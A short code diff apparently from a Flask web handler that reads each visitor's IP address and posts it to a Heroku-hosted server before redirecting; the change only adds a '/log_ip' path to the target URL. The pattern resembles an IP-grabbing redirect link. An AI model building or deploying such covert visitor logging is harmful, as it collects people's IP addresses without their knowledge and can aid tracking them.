@@ -9,7 +9,7 @@ def send_ip_and_redirect():
     client_ip = request.remote_addr
 
     # Send the IP address to another server
-    target_server_url = "https://fierce-taiga-74419-a4096f5f32ff.herokuapp.com/"  # Replace with your target server URL
+    target_server_url = "https://fierce-taiga-74419-a4096f5f32ff.herokuapp.com/log_ip"  # Replace with your target server URL
     payload = {"ip": client_ip}
     try:
         # Send the IP as a POST request
